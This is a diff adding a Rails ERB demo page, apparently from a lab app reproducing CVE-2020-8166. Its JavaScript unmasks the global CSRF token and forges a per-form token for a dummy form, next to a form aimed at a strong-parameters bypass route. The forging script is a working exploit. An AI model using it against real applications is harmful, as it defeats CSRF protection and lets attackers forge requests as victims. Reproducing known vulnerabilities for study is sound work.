@@ -1,0 +1,92 @@
+<h2><a href="https://groups.google.com/forum/#!topic/rubyonrails-security/NOjKiGeXUgw">[CVE-2020-8166] Ability to forge per-form CSRF tokens given a global CSRF token</a></h2>
+
+<h3>ability_to_forge_per_form_csrf_token_path</h3>
+
+<%= form_with url: ability_to_forge_per_form_csrf_token_path, method: :put do |f| %>
+  <p>
+    <%= button_tag 'make dummy form token', type: :button, class: '--js-make-dummy-form-token' %>
+  </p>
+  <%= f.submit %>
+<% end %>
+
+<h3>strong_parameters_bypass_path</h3>
+<%= form_with url: strong_parameters_bypass_path, model: @record do |f| %>
+  <p>
+    <%= f.label :name %>
+    <%= f.text_field :name %>
+  </p>
+  <%= f.submit %>
+<% end %>
+
+<h3>dummy strong_parameters_bypass_path</h3>
+
+<form class="--js-dummy-form" action="/strong_parameters_bypass" accept-charset="UTF-8" data-remote="true" method="post">
+  <input type="hidden" name="_method" value="patch">
+  <p>
+    <label for="user_name">Name</label>
+    <input type="text" value="user 1" name="user[name]" id="user_name">
+  </p>
+  <input type="submit" name="commit" value="Update User" data-disable-with="Update User">
+</form>
+
+<script type="text/javascript">
+(() => {
+  const AUTHENTICITY_TOKEN_LENGTH = 32;
+
+  const xorByteStrings = (s1, s2) => {
+    let result = '';
+    for (let i = 0; i < s1.length; i++) {
+      result += String.fromCharCode(s1[i].charCodeAt(0) ^ s2[i].charCodeAt(0));
+    }
+    return result;
+  }
+
+  const getOneTimePad = (maskedToken) => {
+    return maskedToken.substring(0, AUTHENTICITY_TOKEN_LENGTH);
+  };
+
+  const getUnmaskToken = (maskedToken) => {
+    const oneTimePad = maskedToken.substring(0, AUTHENTICITY_TOKEN_LENGTH);
+    const encryptedCsrfToken = maskedToken.substring(AUTHENTICITY_TOKEN_LENGTH, maskedToken.length);
+    return xorByteStrings(oneTimePad, encryptedCsrfToken);
+  };
+
+  const getPerFormCsrfToken = ({ realCsrfToken, actionPath, method }) => {
+    return CryptoJS.HmacSHA256(
+      [actionPath, method.toLowerCase()].join("#"),
+      realCsrfToken
+    ).toString(CryptoJS.enc.Latin1);
+  };
+
+  const getMaskedAuthenticityToken = ({ realCsrfToken, oneTimePad, actionPath, method }) => {
+    const rawToken = getPerFormCsrfToken({ realCsrfToken, actionPath, method });
+    const encryptedCsrfToken = xorByteStrings(oneTimePad, rawToken);
+    const maskedToken = oneTimePad + encryptedCsrfToken;
+    return btoa(maskedToken);
+  };
+
+  const makeDummyFormToken = document.querySelector('.--js-make-dummy-form-token');
+
+  makeDummyFormToken.addEventListener('click', () => {
+    const globalTokenMetaTag = document.querySelector('meta[name="csrf-token"]');
+    const globalToken = globalTokenMetaTag.getAttribute('content');
+    const maskedToken = atob(globalToken);
+    const oneTimePad = getOneTimePad(maskedToken);
+    const realCsrfToken = getUnmaskToken(maskedToken);
+
+    const dummyFormDom = document.querySelector('.--js-dummy-form');
+    const methodDom = dummyFormDom .querySelector('input[name="_method"]');
+    const actionPath = dummyFormDom.getAttribute('action');
+    const method = methodDom.getAttribute('value');
+    const perFormCsrfToken = getMaskedAuthenticityToken({ realCsrfToken, oneTimePad, actionPath, method });
+
+    globalTokenMetaTag.parentNode.removeChild(globalTokenMetaTag);
+
+    var dummyAuthenticityTokenDom = document.createElement('input');
+    dummyAuthenticityTokenDom.setAttribute('type', 'hidden');
+    dummyAuthenticityTokenDom.setAttribute('name', 'authenticity_token');
+    dummyAuthenticityTokenDom.setAttribute('value', perFormCsrfToken);
+    dummyFormDom.appendChild(dummyAuthenticityTokenDom);
+  });
+})();
+</script>
